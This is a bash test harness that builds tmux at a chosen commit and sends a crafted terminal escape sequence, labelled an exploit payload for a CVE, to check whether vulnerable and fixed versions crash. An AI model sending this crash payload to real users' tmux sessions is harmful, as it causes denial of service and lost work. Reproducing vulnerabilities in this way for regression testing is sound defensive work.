#!/usr/bin/env bash
set -euo pipefail

# Function to run a tmux CVE test
# Arguments:
#   $1: Git commit hash to checkout
#   $2: Description of the version (e.g., "vulnerable version", "fixed version")
#   $3: Expected outcome (e.g., "Expecting a crash", "Expecting NO crash")
#   $4: Timeout in seconds (optional, defaults to 60 seconds)
run_tmux_test() {
  local commit_hash="$1"
  local version_description="$2"
  local expected_outcome="$3"
  local timeout_duration="${4:-60}" # Default: 60 seconds

  echo "=========================================="
  echo "Testing ${version_description} (${commit_hash})"
  echo "=========================================="

  # reset to the specified version
  git reset --hard "${commit_hash}"

  # build tmux from source
  echo "Building tmux from source..."
  sh autogen.sh && ./configure && make
  echo "Build complete."

  echo -e "\n--- Running ${version_description} and attempting to trigger CVE ---"
  echo "${expected_outcome}"

  # execute tmux in the background + get its PID
  ./tmux &
  TMUX_PID=$!
  echo "tmux started with PID: $TMUX_PID"
  sleep 2 # Wait for tmux to start

  # send exploit payload to tmux
  echo -e '\033[::::::7::1:2:3::5:6:7:m' >"/dev/pts/$(tmux list-panes -F '#{pane_tty}' | grep -oP '\d+$' | head -n 1)"
  sleep 1

  echo -e "\n--- Payload sent. Waiting for tmux process with timeout of ${timeout_duration}s ---"

  # in order to wait for tmux to finish, with a timeout we run a subshell
  # that sleeps for $timeout_duration seconds, and then kills tmux if it's still running
  (
    sleep "$timeout_duration" &&
      kill "$TMUX_PID" 2>/dev/null &&
      echo "tmux (PID: $TMUX_PID) timed out and was killed."
  ) &
  TIMEOUT_MONITOR_PID=$!

  # Wait for the TMUX_PID to exit
  wait "$TMUX_PID" 2>/dev/null
  TMUX_EXIT_CODE=$?

  # kill the timeout monitor if tmux exited before the timeout
  if ps -p "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1; then # Check if TIMEOUT_MONITOR_PID is running
    kill "$TIMEOUT_MONITOR_PID" 2>/dev/null
    wait "$TIMEOUT_MONITOR_PID" 2>/dev/null # Clean up the timeout monitor process
  fi

  # check the exit code of tmux in oreder to determine if it crashed or not
  if [ "$TMUX_EXIT_CODE" -eq 0 ]; then
    echo "tmux (PID: $TMUX_PID) exited cleanly."
  elif [ "$TMUX_EXIT_CODE" -eq 124 ]; then
    # Exit code for timeout from `timeout` command (alternative)
    echo "tmux (PID: $TMUX_PID) was killed due to timeout."
  elif [ "$TMUX_EXIT_CODE" -gt 128 ]; then
    # Processes killed by signals have exit codes > 128

    # Signal number is exit code - 128. SIGKILL is 9, so exit code is 137. SIGTERM is 15 (143)
    SIGNAL_NUMBER=$((TMUX_EXIT_CODE - 128))
    if [ "$SIGNAL_NUMBER" -eq 9 ]; then # SIGKILL
      echo "tmux (PID: $TMUX_PID) was killed (SIGKILL)."
    elif [ "$SIGNAL_NUMBER" -eq 15 ]; then # SIGTERM
      echo "tmux (PID: $TMUX_PID) was terminated (SIGTERM)."
    else
      echo "tmux (PID: $TMUX_PID) exited with signal $SIGNAL_NUMBER."
    fi
  else
    echo "tmux (PID: $TMUX_PID) exited with code $TMUX_EXIT_CODE."
  fi

  echo -e "\n--- ${version_description} test complete. ---"
}
